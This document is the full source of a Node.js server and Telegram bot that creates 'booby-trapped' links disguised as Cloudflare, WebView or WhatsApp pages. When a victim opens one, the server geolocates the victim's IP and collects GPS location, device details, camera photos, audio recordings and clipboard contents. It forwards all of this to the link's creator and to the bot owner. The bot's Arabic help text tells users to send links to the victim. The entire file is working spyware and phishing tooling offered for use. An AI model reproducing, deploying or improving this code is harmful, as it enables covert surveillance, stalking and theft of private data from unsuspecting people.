const fs = require("fs");
const express = require("express");

// Users storage
const USERS_FILE = "./users.json";
let users = new Set();
try { JSON.parse(fs.readFileSync(USERS_FILE)).forEach(id => users.add(id)); } catch(e) { users = new Set(); }
function saveUsers() { fs.writeFileSync(USERS_FILE, JSON.stringify([...users])); }

// Banned users storage
const BANNED_FILE = "./banned.json";
let banned = new Set();
try { JSON.parse(fs.readFileSync(BANNED_FILE)).forEach(id => banned.add(id)); } catch(e) { banned = new Set(); }
function saveBanned() { fs.writeFileSync(BANNED_FILE, JSON.stringify([...banned])); }

// Stats storage
const STATS_FILE = "./stats.json";
let stats = { linksOpened: 0, linksCreated: 0 };
try { stats = JSON.parse(fs.readFileSync(STATS_FILE)); } catch(e) {}
function saveStats() { fs.writeFileSync(STATS_FILE, JSON.stringify(stats)); }

// Settings storage
const SETTINGS_FILE = "./settings.json";
let settings = { welcomeMsg: "", silentMode: false };
try { settings = { welcomeMsg: "", silentMode: false, ...JSON.parse(fs.readFileSync(SETTINGS_FILE)) }; } catch(e) {}
function saveSettings() { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings)); }

var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], { polling: true });
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

var hostURL = "https://bot-psue.onrender.com";
var use1pt = false;
const BOT_OWNER = 6012675140;
const REPLY_PREFIX = "📝 اكتب ردك على المستخدم\nUID:";

function getIP(req) {
  if (req.headers['x-forwarded-for']) return req.headers['x-forwarded-for'].split(",")[0].trim();
  if (req.connection && req.connection.remoteAddress) return req.connection.remoteAddress;
  return req.ip;
}

// Fetch enriched IP info from ip-api
async function enrichIP(ip) {
  try {
    const data = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,lat,lon,status`).then(r => r.json());
    if (data.status === "success") {
      return `🌍 الدولة: ${data.country}\n🏙️ المدينة: ${data.city}, ${data.regionName}\n📡 ISP: ${data.isp}\n🏢 المنظمة: ${data.org}\n📌 إحداثيات: ${data.lat}, ${data.lon}`;
    }
  } catch(e) {}
  return null;
}

// Send notification (respects silent mode)
function notify(targetId, message, opts) {
  if (settings.silentMode) return;
  bot.sendMessage(targetId, message, opts || {}).catch(() => {});
}

// ─── Routes ──────────────────────────────────────────────────────────────────

async function handleLinkOpen(req, res, view) {
  const ip = getIP(req);
  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");

  const creatorId = parseInt(req.params.path, 36);
  stats.linksOpened++;
  saveStats();

  // Immediate notification
  const quickMsg = `⚠️ تم فتح رابطك!\n⚓ IP: ${ip}\n⏰ الوقت: ${d} UTC`;
  notify(creatorId, quickMsg);
  if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `⚠️ تم فتح رابط!\n👤 منشئ ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`);

  // Enriched IP details (async - don't block render)
  enrichIP(ip).then(info => {
    if (info) {
      notify(creatorId, `🔍 تفاصيل IP الضحية:\n⚓ IP: ${ip}\n${info}`);
      if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 تفاصيل IP:\n⚓ IP: ${ip}\n${info}`);
    }
  });

  res.render(view, { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
}

app.get("/w/:path/:uri",  (req, res) => handleLinkOpen(req, res, "webview"));
app.get("/c/:path/:uri",  (req, res) => handleLinkOpen(req, res, "cloudflare"));
app.get("/wa/:path/:uri", (req, res) => handleLinkOpen(req, res, "whatsapp"));


// ─── Bot Logic ────────────────────────────────────────────────────────────────

bot.on('message', async (msg) => {
  if (!msg || !msg.chat) return;
  const chatId = msg.chat.id;

  if (banned.has(chatId)) return;

  // ── URL link creation reply ───────────────────────────────────────────────
  if (msg?.reply_to_message?.text === "🌐 Enter Your URL" && msg.text) {
    return createLink(chatId, msg.text);
  }

  // ── Broadcast reply ───────────────────────────────────────────────────────
  if (msg?.reply_to_message?.text === "📢 اكتب الرسالة التي تريد إرسالها للجميع:" && chatId === BOT_OWNER) {
    let sent = 0, failed = 0;
    for (const uid of users) {
      try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; }
    }
    return bot.sendMessage(chatId, `✅ تم الإرسال للجميع\n✔️ ناجح: ${sent}\n❌ فشل: ${failed}`);
  }

  // ── Owner reply to user via force_reply ───────────────────────────────────
  if (chatId === BOT_OWNER && msg?.reply_to_message?.text?.startsWith(REPLY_PREFIX) && msg.text) {
    const uidStr = msg.reply_to_message.text.replace(REPLY_PREFIX, "").split("\n")[0].trim();
    const targetId = parseInt(uidStr);
    if (!isNaN(targetId)) {
      try {
        await bot.sendMessage(targetId, `📩 رسالة:\n\n${msg.text}`);
        return bot.sendMessage(chatId, `✅ تم إرسال ردك.`);
      } catch(e) { return bot.sendMessage(chatId, `❌ فشل: ${e.message}`); }
    }
  }

  users.add(chatId);
  saveUsers();

  // ── Forward user messages to owner ───────────────────────────────────────
  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/")) {
    const name = msg.chat.first_name || "مجهول";
    const username = msg.chat.username ? `@${msg.chat.username}` : "لا يوجد";
    bot.sendMessage(
      BOT_OWNER,
      `📩 رسالة من مستخدم:\n👤 ${name}\n🔗 ${username}\n🆔 ${chatId}\n\n💬 ${msg.text}`,
      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "📩 رد على المستخدم", callback_data: `reply:${chatId}` }]] }) }
    );
  }

  // ── Commands ──────────────────────────────────────────────────────────────

  if (msg.text == "/myid") {
    return bot.sendMessage(chatId, `🆔 الـ ID:\n\`${chatId}\``, { parse_mode: "Markdown" });
  }

  if (msg.text && (msg.text === "/broadcast" || msg.text.startsWith("/broadcast "))) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (msg.text.trim() === "/broadcast") {
      return bot.sendMessage(chatId, "📢 اكتب الرسالة التي تريد إرسالها للجميع:", { reply_markup: JSON.stringify({ force_reply: true }) });
    }
    const text = msg.text.replace("/broadcast ", "");
    let sent = 0, failed = 0;
    for (const uid of users) { try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; } }
    return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
  }

  if (msg.text == "/stats") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const up = Math.floor(process.uptime());
    const h = Math.floor(up / 3600), m = Math.floor((up % 3600) / 60);
    const silent = settings.silentMode ? "🔕 مفعّل" : "🔔 معطّل";
    return bot.sendMessage(chatId, `📊 إحصائيات البوت:\n\n👥 المستخدمون: ${users.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الوضع الصامت: ${silent}\n⏱️ وقت التشغيل: ${h}س ${m}د`);
  }

  if (msg.text == "/users") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const list = [...users].map((id, i) => `${i + 1}. \`${id}\``).join("\n");
    return bot.sendMessage(chatId, `👥 المستخدمون (${users.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  if (msg.text == "/banned") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (banned.size === 0) return bot.sendMessage(chatId, "✅ لا يوجد محجوبون.");
    const list = [...banned].map((id, i) => `${i + 1}. \`${id}\``).join("\n");
    return bot.sendMessage(chatId, `🚫 المحجوبون (${banned.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  if (msg.text && msg.text.startsWith("/ban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/ban ", "").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    banned.add(id); saveBanned();
    return bot.sendMessage(chatId, `🚫 تم حجب: \`${id}\``, { parse_mode: "Markdown" });
  }

  if (msg.text && msg.text.startsWith("/unban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/unban ", "").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    banned.delete(id); saveBanned();
    return bot.sendMessage(chatId, `✅ رُفع الحجب عن: \`${id}\``, { parse_mode: "Markdown" });
  }

  if (msg.text && msg.text.startsWith("/deleteuser ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/deleteuser ", "").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    if (!users.has(id)) return bot.sendMessage(chatId, "⚠️ غير موجود.");
    users.delete(id); saveUsers();
    return bot.sendMessage(chatId, `🗑️ تم حذف \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text == "/clearusers") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const count = users.size; users.clear(); saveUsers();
    return bot.sendMessage(chatId, `🗑️ تم مسح ${count} مستخدم.`);
  }

  // /export — export users list as file
  if (msg.text == "/export") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const content = `📋 قائمة مستخدمي البوت\nالتاريخ: ${new Date().toISOString()}\nالعدد: ${users.size}\n\n` + [...users].map((id, i) => `${i + 1}. ${id}`).join("\n");
    const buf = Buffer.from(content, 'utf8');
    return bot.sendDocument(chatId, buf, { caption: `📤 قائمة المستخدمين (${users.size})` }, { filename: "users.txt", contentType: "text/plain" });
  }

  // /silent — toggle silent mode
  if (msg.text == "/silent") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.silentMode = !settings.silentMode;
    saveSettings();
    return bot.sendMessage(chatId, settings.silentMode
      ? "🔕 الوضع الصامت مفعّل\nالبيانات تُجمع بدون إشعارات."
      : "🔔 الوضع الصامت معطّل\nستصلك جميع الإشعارات."
    );
  }

  if (msg.text && msg.text.startsWith("/link ")) {
    return createLink(chatId, msg.text.replace("/link ", "").trim());
  }

  if (msg.text == "/ping") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const start = Date.now();
    const m = await bot.sendMessage(chatId, "🏓 Pong!");
    const ms = Date.now() - start;
    return bot.editMessageText(`🏓 Pong! \`${ms}ms\``, { chat_id: chatId, message_id: m.message_id, parse_mode: "Markdown" });
  }

  if (msg.text && msg.text.startsWith("/setwelcome ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.welcomeMsg = msg.text.replace("/setwelcome ", "").trim();
    saveSettings();
    return bot.sendMessage(chatId, `✅ تم تحديث رسالة الترحيب.`);
  }

  if (msg.text == "/resetwelcome") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.welcomeMsg = ""; saveSettings();
    return bot.sendMessage(chatId, `✅ تمت إعادة الترحيب للافتراضي.`);
  }

  if (msg.text == "/start") {
    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: [
      [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
      [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }]
    ]}) };
    const welcome = settings.welcomeMsg ||
      `مرحباً بڪ ${msg.chat.first_name}! 👋\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع الجغرافي (GPS+IP)\n📱 معلومات الجهاز والبطارية\n📷 صور الكاميرا\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n📋 محتوى الحافظة\n🔍 بيانات IP (ISP، مدينة، دولة)\n\n⚡ Powered by @Ye_x00`;
    return bot.sendMessage(chatId, welcome, keyboard);
  }

  if (msg.text == "/create") return createNew(chatId);

  if (msg.text == "/help") {
    let helpText = `📖 طريقة الاستخدام:\n\n1️⃣ أنشئ رابطاً ملغماً\n2️⃣ أرسله للضحية\n\n📥 يصلك عند الفتح:\n   ⚡ إشعار فوري + تفاصيل IP\n   🌍 ISP والدولة والمدينة\n   📱 بيانات الجهاز\n   📷 صور الكاميرا\n   📍 الموقع (GPS أو IP)\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n\n🔗 ثلاثة أنواع روابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n\n⚡ Powered by @Ye_x00`;
    if (chatId === BOT_OWNER) {
      helpText += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات\n/users — المستخدمون\n/export — تصدير القائمة كملف\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف مستخدم\n/clearusers — مسح الكل\n/silent — تبديل الوضع الصامت 🔕\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/ping — اختبار السرعة\n\n💡 رد على مستخدم: زر 📩 على رسالته`;
    }
    return bot.sendMessage(chatId, helpText);
  }
});

// ─── Callback Queries ─────────────────────────────────────────────────────────

bot.on('callback_query', async function(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === "crenew") return createNew(chatId);

  if (data === "help") {
    return bot.sendMessage(chatId, `📖 طريقة الاستخدام:\n\n1️⃣ أنشئ رابطاً ملغماً\n2️⃣ أرسله للضحية\n\n📥 يصلك:\n   ⚡ IP + تفاصيل المزوّد\n   📱 بيانات الجهاز\n   📷 صور الكاميرا\n   📍 موقع GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n\n⚡ Powered by @Ye_x00`);
  }

  if (data === "myid") {
    return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
  }

  if (data.startsWith("reply:")) {
    const targetId = data.replace("reply:", "");
    return bot.sendMessage(chatId, `${REPLY_PREFIX}${targetId}\n\nاكتب ردك:`, { reply_markup: JSON.stringify({ force_reply: true }) });
  }
});

bot.on('polling_error', () => {});


// ─── Link Creation ────────────────────────────────────────────────────────────

async function createLink(cid, msg) {
  if (!msg || typeof msg !== 'string') return;
  const encoded = [...msg].some(char => char.charCodeAt(0) > 127);
  if (msg.toLowerCase().includes('http') && !encoded) {
    const url = cid.toString(36) + '/' + btoa(msg);
    const m = { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "🔗 إنشاء رابط جديد", callback_data: "crenew" }]] }) };
    bot.sendChatAction(cid, "typing");
    stats.linksCreated++;
    saveStats();
    bot.sendMessage(cid,
      `✅ تم إنشاء الروابط!\n🔗 URL: ${msg}\n\n🌐 Cloudflare:\n${hostURL}/c/${url}\n\n🖥️ WebView:\n${hostURL}/w/${url}\n\n💬 WhatsApp:\n${hostURL}/wa/${url}`,
      m
    );
  } else {
    bot.sendMessage(cid, `⚠️ أدخل رابطاً صحيحاً يبدأ بـ http أو https`);
    createNew(cid);
  }
}

function createNew(cid) {
  bot.sendMessage(cid, `🌐 Enter Your URL`, { reply_markup: JSON.stringify({ force_reply: true }) });
}


// ─── Data Endpoints ──────────────────────────────────────────────────────────

app.get("/", (req, res) => res.json({ ip: getIP(req) }));

app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;
  if (lat && lon && uid && acc) {
    const targetId = parseInt(uid, 36);
    const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
    const locMsg = `📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}\n🗺️ ${mapsLink}`;
    if (!settings.silentMode) {
      bot.sendLocation(targetId, lat, lon);
      bot.sendMessage(targetId, locMsg);
      if (targetId !== BOT_OWNER) {
        bot.sendLocation(BOT_OWNER, lat, lon);
        bot.sendMessage(BOT_OWNER, `📍 موقع (ID: ${targetId}):\n${locMsg}`);
      }
    }
    res.send("Done");
  } else res.send("Missing");
});

app.post("/", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  let data = decodeURIComponent(req.body.data) || null;
  if (uid && data) {
    data = data.replaceAll("<br>", "\n");
    const targetId = parseInt(uid, 36);
    if (!settings.silentMode) {
      bot.sendMessage(targetId, data, { parse_mode: "HTML" });
      if (targetId !== BOT_OWNER) bot.sendMessage(BOT_OWNER, `📋 بيانات (ID: ${targetId}):\n${data}`, { parse_mode: "HTML" });
    }
    res.send("Done");
  } else res.send("Missing");
});

app.post("/camsnap", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const img = decodeURIComponent(req.body.img) || null;
  if (uid && img) {
    const buffer = Buffer.from(img, 'base64');
    const info = { filename: "camsnap.png", contentType: 'image/png' };
    const targetId = parseInt(uid, 36);
    if (!settings.silentMode) {
      try {
        bot.sendPhoto(targetId, buffer, {}, info);
        if (targetId !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buffer, {}, info);
      } catch(e) {}
    }
    res.send("Done");
  } else res.send("Missing");
});

app.post("/audio", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const audio = decodeURIComponent(req.body.audio) || null;
  if (uid && audio) {
    const buffer = Buffer.from(audio, 'base64');
    const info = { filename: "voice.webm", contentType: 'audio/webm' };
    const targetId = parseInt(uid, 36);
    if (!settings.silentMode) {
      try {
        bot.sendDocument(targetId, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
        if (targetId !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buffer, { caption: `🎙️ صوت (ID: ${targetId})` }, info);
      } catch(e) {}
    }
    res.send("Done");
  } else res.send("Missing");
});

// Clipboard endpoint
app.post("/clipboard", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const clip = decodeURIComponent(req.body.clip) || null;
  if (uid && clip) {
    const targetId = parseInt(uid, 36);
    const msg = `📋 محتوى الحافظة:\n\n${clip}`;
    if (!settings.silentMode) {
      bot.sendMessage(targetId, msg);
      if (targetId !== BOT_OWNER) bot.sendMessage(BOT_OWNER, `📋 حافظة (ID: ${targetId}):\n${clip}`);
    }
    res.send("Done");
  } else res.send("Missing");
});


// ─── Keep Alive ──────────────────────────────────────────────────────────────

setInterval(() => fetch(hostURL).catch(() => {}), 5 * 60 * 1000);

app.listen(5000, () => console.log("App Running on Port 5000!"));
